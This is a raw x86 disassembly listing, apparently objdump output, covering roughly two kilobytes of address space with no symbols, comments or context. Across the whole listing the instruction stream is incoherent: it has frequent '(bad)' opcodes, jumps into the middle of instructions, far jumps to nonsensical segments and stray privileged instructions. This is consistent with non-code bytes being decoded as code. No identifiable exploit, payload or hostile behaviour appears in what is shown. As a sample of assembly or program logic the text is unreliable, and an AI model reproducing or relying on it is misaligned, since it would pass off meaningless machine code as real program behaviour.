  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
